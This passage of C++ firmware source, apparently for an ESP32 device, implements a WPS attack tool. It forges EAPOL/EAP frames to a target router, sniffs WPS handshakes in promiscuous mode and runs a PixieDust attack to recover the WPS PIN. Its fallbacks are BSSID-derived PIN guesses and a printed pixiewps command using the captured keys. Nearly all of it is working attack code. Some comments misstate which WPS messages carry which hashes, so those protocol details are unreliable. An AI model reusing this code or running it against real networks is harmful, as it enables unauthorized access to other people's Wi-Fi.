    int ep = 0;
    eap_body[ep++] = EAP_TYPE_EXPANDED;
    eap_body[ep++] = 0x00; eap_body[ep++] = 0x37; eap_body[ep++] = 0x2A;
    eap_body[ep++] = 0x00; eap_body[ep++] = 0x00; eap_body[ep++] = 0x00; eap_body[ep++] = 0x01;
    eap_body[ep++] = 0x05;  // WSC_ACK
    eap_body[ep++] = 0x00;
    int len = _buildEapResponseFrame(_tx_buf, _ap.bssid, _our_mac, _ap.bssid,
                                      eap_id, eap_body, ep);
    if (len > 0) {
        esp_wifi_80211_tx(WIFI_IF_STA, _tx_buf, len, false);
        Serial.println("[WPS-A1] WSC-ACK sent");
    }

    // If we got R-Hash1/R-Hash2, run PixieDust NOW
    if (_capture.has_m3) {
        setState(WPS_STATE_PIXIE_RUNNING, "[WPS-A1] M2 complete (R-Hash1+R-Hash2+AuthKey). Running PixieDust!");
    } else {
        Serial.println("[WPS-A1] R-Hash not in M2 — switching to passive capture.");
        _startPassiveCapture();
    }
}

void WpsAttack::_processM3(const uint8_t *wsc_tlvs, int tlv_len) {
    // M3 contains E-Hash1/E-Hash2 (from enrollee, NOT what we crack in PixieDust).
    // We may land here if someone sends M3 — just log and ignore.
    Serial.printf("[WPS-A1] M3 received (%d bytes) — not needed for PixieDust\n", tlv_len);
}

// ── Run PixieDust ─────────────────────────────────────────────────────────────
void WpsAttack::_runPixieDust() {
    if (!_capture.has_m1 || !_capture.has_m2 || !_capture.has_m3) {
        Serial.printf("[Pixie] Incomplete: M1=%d M2=%d hashes=%d\n",
                      (int)_capture.has_m1, (int)_capture.has_m2, (int)_capture.has_m3);
        if (_attempt == 1) _startPassiveCapture();
        else _reportPinCandidates();
        return;
    }

    Serial.println("[Pixie] ===== PIXIEDUST ATTACK =====");
    Serial.printf("[Pixie] PKE[0..7]: %02X%02X%02X%02X%02X%02X%02X%02X\n",
                  _capture.pke[0], _capture.pke[1], _capture.pke[2], _capture.pke[3],
                  _capture.pke[4], _capture.pke[5], _capture.pke[6], _capture.pke[7]);
    Serial.printf("[Pixie] PKR[0..7]: %02X%02X%02X%02X%02X%02X%02X%02X\n",
                  _capture.pkr[0], _capture.pkr[1], _capture.pkr[2], _capture.pkr[3],
                  _capture.pkr[4], _capture.pkr[5], _capture.pkr[6], _capture.pkr[7]);
    Serial.printf("[Pixie] AuthKey:   %02X%02X%02X%02X...\n",
                  _capture.auth_key[0], _capture.auth_key[1],
                  _capture.auth_key[2], _capture.auth_key[3]);
    Serial.printf("[Pixie] R-Hash1:   %02X%02X%02X%02X...\n",
                  _capture.e_hash1[0], _capture.e_hash1[1],
                  _capture.e_hash1[2], _capture.e_hash1[3]);
    Serial.printf("[Pixie] R-Hash2:   %02X%02X%02X%02X...\n",
                  _capture.e_hash2[0], _capture.e_hash2[1],
                  _capture.e_hash2[2], _capture.e_hash2[3]);

    PixieDustResult res = _pixie.run(
        _capture.pke, _capture.pkr, _capture.auth_key,
        _capture.e_nonce, _capture.e_hash1, _capture.e_hash2
    );

    if (res.found) {
        memcpy(_foundPin, res.pin, 9);
        char msg[160];
        snprintf(msg, sizeof(msg),
                 "[WPS] *** PIXIEDUST SUCCESS *** PIN=%s AP=%s BSSID=%02X:%02X:%02X:%02X:%02X:%02X",
                 res.pin, _ap.essid.c_str(),
                 _ap.bssid[0], _ap.bssid[1], _ap.bssid[2],
                 _ap.bssid[3], _ap.bssid[4], _ap.bssid[5]);
        setState(WPS_STATE_PIN_FOUND, msg);
        return;
    }

    Serial.println("[Pixie] PixieDust failed — AP uses strong RNG or non-standard nonces.");
    if (_attempt == 1) {
        Serial.println("[Pixie] Switching to passive capture for 2 minutes...");
        _startPassiveCapture();
    } else {
        _reportPinCandidates();
    }
}

// ════════════════════════════════════════════════════════════════════════════
// ATTEMPT 2: Passive capture of WPS exchanges from other clients
// ════════════════════════════════════════════════════════════════════════════

void WpsAttack::_startPassiveCapture() {
    _attempt = 2;
    Serial.println("[WPS-A2] ===== PASSIVE WPS CAPTURE =====");
    Serial.printf("[WPS-A2] Watching CH:%d for %d seconds for WPS exchanges.\n",
                  _ap.channel, WPS_PASSIVE_TIMEOUT_MS / 1000);
    Serial.println("[WPS-A2] ACTION: Press WPS button on the router to trigger an exchange.");
    Serial.println("[WPS-A2] OR: Connect a WPS client device to the target AP.");

    WiFi.disconnect(false);
    delay(100);
    esp_wifi_set_channel(_ap.channel, WIFI_SECOND_CHAN_NONE);

    const wifi_promiscuous_filter_t filt = {.filter_mask = 0xFFFFFFFF};
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&wifi_scan_wps_sniffer_cb);
    esp_wifi_set_promiscuous(true);

    // Reset capture but keep our active M1 data if we got it from attempt 1
    bool keep_m1 = _capture.has_m1;
    if (!keep_m1) {
        memset(&_capture, 0, sizeof(_capture));
        memcpy(_capture.ap_mac, _ap.bssid, 6);
    } else {
        // Keep our M1 data; reset M2/M3
        _capture.has_m2 = false;
        _capture.has_m3 = false;
        memset(_capture.pkr, 0, sizeof(_capture.pkr));
        memset(_capture.r_nonce, 0, sizeof(_capture.r_nonce));
        memset(_capture.e_hash1, 0, sizeof(_capture.e_hash1));
        memset(_capture.e_hash2, 0, sizeof(_capture.e_hash2));
        memset(_capture.auth_key, 0, sizeof(_capture.auth_key));
    }

    setState(WPS_STATE_PASSIVE_SCAN, "[WPS-A2] Passive capture active. Waiting...");
}

void WpsAttack::_passiveLoop(uint32_t now) {
    uint32_t elapsed = now - _stateTimestamp;

    static uint32_t last_status = 0;
    if (now - last_status > 15000) {
        last_status = now;
        Serial.printf("[WPS-A2] Waiting... %us elapsed | M1:%d M2:%d hashes:%d\n",
                      elapsed / 1000,
                      (int)_capture.has_m1, (int)_capture.has_m2, (int)_capture.has_m3);
    }

    // All needed: M2 (PKR+R-Nonce) and hashes (R-Hash1/R-Hash2)
    // Note: for passive, auth_key is zeros — PixieDust may still work on Ralink APs
    if (_capture.has_m2 && _capture.has_m3) {
        setState(WPS_STATE_PASSIVE_PIXIE,
                 "[WPS-A2] M2 + R-Hash captured! Running PixieDust (auth_key=zeros for passive)...");
        _runPixieDust();
        return;
    }

    if (elapsed > WPS_PASSIVE_TIMEOUT_MS) {
        Serial.printf("[WPS-A2] Timeout after %us. Captured: M1=%d M2=%d hashes=%d\n",
                      elapsed / 1000,
                      (int)_capture.has_m1, (int)_capture.has_m2, (int)_capture.has_m3);
        _reportPinCandidates();
    }
}

// ── Parse WSC frame from promiscuous callback (passive mode) ──────────────────
// eap_frame: starts at EAP header (Code[0] Id[1] Len[2..3] Type[4] ...)
// src_mac: sender MAC from 802.11 header
bool WpsAttack::_parseWscFrame(const uint8_t *eap_frame, int frame_len,
                                 const uint8_t *src_mac, const uint8_t *dst_mac)
{
    // Need at least: Code+Id+Len+Type+VendorID+VType+OpCode+Flags = 14 bytes
    if (!eap_frame || frame_len < 14) return false;

    uint8_t eap_code = eap_frame[0];
    // uint8_t eap_id   = eap_frame[1];
    uint8_t eap_type = eap_frame[4];

    if (eap_type != EAP_TYPE_EXPANDED) return false;
    // Check WFA VendorID
    if (eap_frame[5] != 0x00 || eap_frame[6] != 0x37 || eap_frame[7] != 0x2A) return false;
    // Check VendorType 0x00000001
    if (eap_frame[8]!=0||eap_frame[9]!=0||eap_frame[10]!=0||eap_frame[11]!=1) return false;

    uint8_t opcode = eap_frame[12];
    if (opcode != 0x04) return false;  // WSC_MSG only

    const uint8_t *tlv_data = eap_frame + 14;
    int tlv_len = frame_len - 14;
    if (tlv_len < 4) return false;

    // Check message type
    uint16_t mlen;
    const uint8_t *mtype_p = tlvFind(tlv_data, tlv_len, WPS_ATTR_MSG_TYPE, mlen);
    if (!mtype_p || mlen < 1) return false;
    uint8_t msg_type = mtype_p[0];

    uint16_t out_len;

    // Determine direction from EAP code and src_mac vs AP BSSID
    bool from_ap = (src_mac && memcmp(src_mac, _capture.ap_mac, 6) == 0);
    // Also: EAP-Request (code=1) = from AP/Registrar, EAP-Response (code=2) = from client/Enrollee
    if (eap_code == EAP_CODE_REQUEST) from_ap = true;
    if (eap_code == EAP_CODE_RESPONSE) from_ap = false;

    if (msg_type == WPS_MSG_M1 && !from_ap) {
        // M1: Enrollee → Registrar (client → AP)
        const uint8_t *pke = tlvFind(tlv_data, tlv_len, WPS_ATTR_PUBLIC_KEY, out_len);
        const uint8_t *en  = tlvFind(tlv_data, tlv_len, WPS_ATTR_ENROLLEE_NONCE, out_len);
        if (!pke || !en) {
            Serial.println("[WPS-A2] M1: PKE or E-Nonce missing");
            return false;
        }
        memcpy(_capture.pke, pke, 192);
        uint16_t en_len;
        const uint8_t *en2 = tlvFind(tlv_data, tlv_len, WPS_ATTR_ENROLLEE_NONCE, en_len);
        if (en2 && en_len >= 16) memcpy(_capture.e_nonce, en2, 16);
        if (src_mac) memcpy(_capture.sta_mac, src_mac, 6);
        _capture.has_m1 = true;
        Serial.printf("[WPS-A2] *** M1 captured! PKE[0..3]=%02X%02X%02X%02X E-Nonce[0..3]=%02X%02X%02X%02X\n",
                      _capture.pke[0], _capture.pke[1], _capture.pke[2], _capture.pke[3],
                      _capture.e_nonce[0], _capture.e_nonce[1],
                      _capture.e_nonce[2], _capture.e_nonce[3]);
        return true;
    }

    if (msg_type == WPS_MSG_M2 && from_ap) {
        // M2: Registrar → Enrollee (AP → client) — contains R-Hash1, R-Hash2!
        const uint8_t *pkr = tlvFind(tlv_data, tlv_len, WPS_ATTR_PUBLIC_KEY, out_len);
        const uint8_t *rn  = tlvFind(tlv_data, tlv_len, WPS_ATTR_REGISTRAR_NONCE, out_len);
        if (!pkr || !rn) {
            Serial.println("[WPS-A2] M2: PKR or R-Nonce missing");
            return false;
        }
        memcpy(_capture.pkr, pkr, 192);
        uint16_t rn_len;
        const uint8_t *rn2 = tlvFind(tlv_data, tlv_len, WPS_ATTR_REGISTRAR_NONCE, rn_len);
        if (rn2 && rn_len >= 16) memcpy(_capture.r_nonce, rn2, 16);

        // Extract R-Hash1 and R-Hash2 from M2!
        const uint8_t *rh1 = tlvFind(tlv_data, tlv_len, WPS_ATTR_R_HASH1, out_len);
        const uint8_t *rh2 = tlvFind(tlv_data, tlv_len, WPS_ATTR_R_HASH2, out_len);
        if (rh1 && out_len >= 32) {
            memcpy(_capture.e_hash1, rh1, 32);
            Serial.printf("[WPS-A2] *** M2 R-Hash1=%02X%02X%02X%02X...\n",
                          rh1[0], rh1[1], rh1[2], rh1[3]);
        }
        if (rh2 && out_len >= 32) {
            memcpy(_capture.e_hash2, rh2, 32);
            Serial.printf("[WPS-A2] *** M2 R-Hash2=%02X%02X%02X%02X...\n",
                          rh2[0], rh2[1], rh2[2], rh2[3]);
            _capture.has_m3 = true;  // "hashes ready"
        }
        // auth_key stays zeros — passive limitation
        _capture.has_m2 = true;
        Serial.printf("[WPS-A2] *** M2 captured! PKR[0..3]=%02X%02X%02X%02X R-Nonce[0..3]=%02X%02X%02X%02X\n",
                      _capture.pkr[0], _capture.pkr[1], _capture.pkr[2], _capture.pkr[3],
                      _capture.r_nonce[0], _capture.r_nonce[1],
                      _capture.r_nonce[2], _capture.r_nonce[3]);
        return true;
    }

    return false;
}

// ════════════════════════════════════════════════════════════════════════════
// ATTEMPT 3: PIN candidate list
// ════════════════════════════════════════════════════════════════════════════

void WpsAttack::_reportPinCandidates() {
    _attempt = 3;
    Serial.println("[WPS-A3] ===== PIN CANDIDATE LIST =====");
    Serial.printf("[WPS-A3] AP: %s BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
                  _ap.essid.c_str(),
                  _ap.bssid[0], _ap.bssid[1], _ap.bssid[2],
                  _ap.bssid[3], _ap.bssid[4], _ap.bssid[5]);
    if (_pins.empty()) _pins = WpsPinGen::getAllPins(_ap.bssid);
    Serial.printf("[WPS-A3] %d PIN candidates (BSSID-derived):\n", (int)_pins.size());
    for (int i = 0; i < (int)_pins.size(); i++) {
        Serial.printf("  PIN[%d]: %s\n", i + 1, _pins[i].c_str());
    }
    // Print captured raw data for offline use
    if (_capture.has_m1 || _capture.has_m2) {
        Serial.println("[WPS-A3] === CAPTURED DATA (for offline pixiewps) ===");
        Serial.printf("[WPS-A3] PKE: ");
        for (int i=0;i<192;i++) Serial.printf("%02X",_capture.pke[i]); Serial.println();
        Serial.printf("[WPS-A3] PKR: ");
        for (int i=0;i<192;i++) Serial.printf("%02X",_capture.pkr[i]); Serial.println();
        Serial.printf("[WPS-A3] E-Nonce: ");
        for (int i=0;i<16;i++) Serial.printf("%02X",_capture.e_nonce[i]); Serial.println();
        Serial.printf("[WPS-A3] R-Nonce: ");
        for (int i=0;i<16;i++) Serial.printf("%02X",_capture.r_nonce[i]); Serial.println();
        Serial.printf("[WPS-A3] R-Hash1: ");
        for (int i=0;i<32;i++) Serial.printf("%02X",_capture.e_hash1[i]); Serial.println();
        Serial.printf("[WPS-A3] R-Hash2: ");
        for (int i=0;i<32;i++) Serial.printf("%02X",_capture.e_hash2[i]); Serial.println();
        Serial.println("[WPS-A3] Use: pixiewps -e <PKE> -r <PKR> -s <E-Nonce> -z <R-Nonce> -a <R-Hash1> -b <R-Hash2>  -n <AuthKey if known>");
    }
    setState(WPS_STATE_FAILED,
             "[WPS] All 3 attempts exhausted. See PIN candidates and captured data above.");
}

// ════════════════════════════════════════════════════════════════════════════
// Main loop
// ════════════════════════════════════════════════════════════════════════════

void WpsAttack::loop(uint32_t currentTime) {
    if (_state == WPS_STATE_IDLE)      return;
    if (_state == WPS_STATE_PIN_FOUND) return;
    if (_state == WPS_STATE_FAILED)    return;

    if (_state == WPS_STATE_NATIVE_WPS) {
        _nativeWpsLoop(currentTime);
        return;
    }

    if (_attempt == 1) {
        _attempt1Loop(currentTime);
    } else if (_attempt == 2) {
        _passiveLoop(currentTime);
    }
}

// ════════════════════════════════════════════════════════════════════════════
// stop()
// ════════════════════════════════════════════════════════════════════════════

void WpsAttack::stop() {
    if (_state != WPS_STATE_IDLE) {
        Serial.println("[WPS] Attack stopped.");
        // Native WPS cleanup
        if (_state == WPS_STATE_NATIVE_WPS) {
            esp_wifi_wps_disable();
        }
        if (_nwps_event_instance) {
            esp_event_handler_instance_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                                  _nwps_event_instance);
            _nwps_event_instance = nullptr;
        }
        // If we're in a connection attempt, cancel it
        if (_attempt == 1 && (_state == WPS_STATE_CONNECTING ||
                               _state == WPS_STATE_EAPOL_START ||
                               _state == WPS_STATE_EAP_IDENTITY ||
                               _state == WPS_STATE_M1_SENT)) {
            esp_wifi_disconnect();
        }
        esp_wifi_set_promiscuous(false);
        WiFi.disconnect(false);
        if (_wifi_event_instance) {
            esp_event_handler_instance_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                                  _wifi_event_instance);
            _wifi_event_instance = nullptr;
        }
        setState(WPS_STATE_IDLE);
    }
}

// ════════════════════════════════════════════════════════════════════════════
// Promiscuous callback handlers (called by WiFiScan::wpsSnifferCallback)
// eapol_payload: starts at EAPOL Version byte (after LLC/SNAP)
//   [0] EAPOL Version
//   [1] EAPOL Type (0=Packet, 1=Start)
//   [2..3] EAPOL Length
//   [4] EAP Code (1=Req, 2=Resp)
//   [5] EAP Id
//   [6..7] EAP Length
//   [8] EAP Type
//   ...
// ════════════════════════════════════════════════════════════════════════════

void WpsAttack::handleEapolFrame(const uint8_t *payload, int len, const uint8_t *src_mac)
{
    if (!payload || len < 5) return;

    uint8_t eapol_type = payload[1];
    if (eapol_type == EAPOL_TYPE_START) return;  // Ignore EAPOL-Start from others
    if (eapol_type != EAPOL_TYPE_PACKET) return;

    if (len < 9) return;
    // EAP frame starts at payload[4]
    const uint8_t *eap = payload + 4;
    int eap_len = len - 4;

    uint8_t eap_code = eap[0];
    uint8_t eap_id   = eap[1];
    uint8_t eap_type = (eap_len >= 5) ? eap[4] : 0;

    // ── Filter: only frames from/to our target AP ────────────────────────────
    // src_mac is Address 2 from 802.11 header
    // For ToDS=0 (AP→STA): src_mac = AP BSSID (Address 2 = Transmitter)
    // For ToDS=1 (STA→AP): src_mac = STA MAC
    bool from_ap = src_mac && (memcmp(src_mac, _capture.ap_mac, 6) == 0);

    // ── ACTIVE ATTEMPT 1 ─────────────────────────────────────────────────────
    if (_attempt == 1 && eap_code == EAP_CODE_REQUEST && from_ap) {

        if (eap_type == EAP_TYPE_IDENTITY) {
            Serial.printf("[WPS-A1] EAP-Request/Identity from AP (id=%d)\n", eap_id);
            _eap_id = eap_id;
            if (_state == WPS_STATE_EAPOL_START) {
                _sendEapIdentityResponse(eap_id);
            }
            return;
        }

        if (eap_type == EAP_TYPE_EXPANDED && eap_len >= 14) {
            // eap[12] = OpCode, eap+14 = WSC TLV data
            uint8_t opcode = eap[12];
            Serial.printf("[WPS-A1] EAP-Expanded from AP: opcode=0x%02X id=%d state=%d\n",
                          opcode, eap_id, _state);

            // WSC-Start (opcode=0x01)
            if (opcode == 0x01 && _state == WPS_STATE_EAP_IDENTITY) {
                Serial.println("[WPS-A1] WSC-Start received!");
                _buildAndSendM1(eap_id);
                return;
            }

            // WSC_MSG (opcode=0x04) — could be M2
            if (opcode == 0x04 && _state == WPS_STATE_M1_SENT) {
                // TLV data starts at eap[14]
                const uint8_t *tlv_data = eap + 14;
                int tlv_len = eap_len - 14;
                if (tlv_len < 4) return;
                uint16_t mlen;
                const uint8_t *mtype_p = tlvFind(tlv_data, tlv_len, WPS_ATTR_MSG_TYPE, mlen);
                if (mtype_p && mlen >= 1 && mtype_p[0] == WPS_MSG_M2) {
                    Serial.printf("[WPS-A1] M2 received from AP! TLV bytes=%d\n", tlv_len);
                    _processM2(tlv_data, tlv_len, eap_id);
                    return;
                }
                Serial.printf("[WPS-A1] WSC_MSG: type=0x%02X\n",
                              mtype_p ? mtype_p[0] : 0xFF);
            }
        }
    }

    // ── PASSIVE ATTEMPT 2 ─────────────────────────────────────────────────────
    if (_attempt == 2 && _state == WPS_STATE_PASSIVE_SCAN) {
        if (eap_type == EAP_TYPE_EXPANDED && eap_len >= 14) {
            _parseWscFrame(eap, eap_len, src_mac,
                           from_ap ? _capture.sta_mac : _capture.ap_mac);
        }
    }
}

void WpsAttack::handleMgmtFrame(const uint8_t *payload, int len)
{
    (void)payload; (void)len;
}

// ════════════════════════════════════════════════════════════════════════════
// 802.11 DATA frame builders
// ════════════════════════════════════════════════════════════════════════════

int WpsAttack::_buildEapolStartFrame(uint8_t *buf, const uint8_t *dst,
                                      const uint8_t *src, const uint8_t *bssid)
{
    int pos = 0;
    // 802.11 Data header: FC0=0x08 (Data), FC1=0x01 (ToDS)
    buf[pos++] = 0x08; buf[pos++] = 0x01;
    buf[pos++] = 0x3A; buf[pos++] = 0x01;  // Duration
    memcpy(buf+pos, dst, 6); pos+=6;   // Address1 = DA (BSSID)
    memcpy(buf+pos, src, 6); pos+=6;   // Address2 = SA (our MAC)
    memcpy(buf+pos, bssid, 6); pos+=6; // Address3 = BSSID
    buf[pos++] = (uint8_t)((s_dot11_seq & 0x0F) << 4);
    buf[pos++] = (uint8_t)((s_dot11_seq >> 4) & 0xFF);
    s_dot11_seq++;
    // LLC/SNAP: AA AA 03 00 00 00 88 8E
    buf[pos++]=0xAA; buf[pos++]=0xAA; buf[pos++]=0x03;
    buf[pos++]=0x00; buf[pos++]=0x00; buf[pos++]=0x00;
    buf[pos++]=0x88; buf[pos++]=0x8E;
    // EAPOL-Start: Version=1, Type=1, Length=0
    buf[pos++]=0x01; buf[pos++]=0x01; buf[pos++]=0x00; buf[pos++]=0x00;
    return pos;
}

int WpsAttack::_buildEapResponseFrame(uint8_t *buf, const uint8_t *dst,
                                       const uint8_t *src, const uint8_t *bssid,
                                       uint8_t eap_id,
                                       const uint8_t *eap_body, int eap_body_len)
{
    int eap_total = 4 + eap_body_len;  // Code+Id+Len(2)+body
    int pos = 0;
    buf[pos++]=0x08; buf[pos++]=0x01;
    buf[pos++]=0x3A; buf[pos++]=0x01;
    memcpy(buf+pos, dst, 6); pos+=6;
    memcpy(buf+pos, src, 6); pos+=6;
    memcpy(buf+pos, bssid, 6); pos+=6;
    buf[pos++]=(uint8_t)((s_dot11_seq&0x0F)<<4);
    buf[pos++]=(uint8_t)((s_dot11_seq>>4)&0xFF);
    s_dot11_seq++;
    buf[pos++]=0xAA; buf[pos++]=0xAA; buf[pos++]=0x03;
    buf[pos++]=0x00; buf[pos++]=0x00; buf[pos++]=0x00;
    buf[pos++]=0x88; buf[pos++]=0x8E;
    // EAPOL: Version=1, Type=0 (EAP-Packet), Length=eap_total
    buf[pos++]=0x01; buf[pos++]=0x00;
    buf[pos++]=(eap_total>>8)&0xFF; buf[pos++]=eap_total&0xFF;
    // EAP: Code=Response(2), Id, Length
    buf[pos++]=EAP_CODE_RESPONSE;
    buf[pos++]=eap_id;
    buf[pos++]=(eap_total>>8)&0xFF; buf[pos++]=eap_total&0xFF;
    if (pos + eap_body_len > 599) return -1;
    memcpy(buf+pos, eap_body, eap_body_len); pos+=eap_body_len;
    return pos;
}

// ════════════════════════════════════════════════════════════════════════════
// TLV helpers
// ════════════════════════════════════════════════════════════════════════════

int WpsAttack::tlvAppend(uint8_t *buf, int pos,
                          uint16_t type, const uint8_t *val, uint16_t len) {
    buf[pos++]=(type>>8)&0xFF; buf[pos++]=type&0xFF;
    buf[pos++]=(len>>8)&0xFF;  buf[pos++]=len&0xFF;
    memcpy(buf+pos, val, len);
    return pos+len;
}

int WpsAttack::tlvAppend16(uint8_t *buf, int pos, uint16_t type, uint16_t val) {
    uint8_t v[2]={(uint8_t)(val>>8),(uint8_t)(val&0xFF)};
    return tlvAppend(buf,pos,type,v,2);
}

int WpsAttack::tlvAppend8(uint8_t *buf, int pos, uint16_t type, uint8_t val) {
    return tlvAppend(buf,pos,type,&val,1);
}

const uint8_t* WpsAttack::tlvFind(const uint8_t *buf, int buflen,
                                    uint16_t type, uint16_t &out_len) {
    int pos=0;
    while (pos+4<=buflen) {
        uint16_t t=((uint16_t)buf[pos]<<8)|buf[pos+1];
        uint16_t l=((uint16_t)buf[pos+2]<<8)|buf[pos+3];
        if (t==type) {
            if (pos+4+l<=buflen) { out_len=l; return buf+pos+4; }
            return nullptr;
        }
        pos+=4+l;
    }
    return nullptr;
}
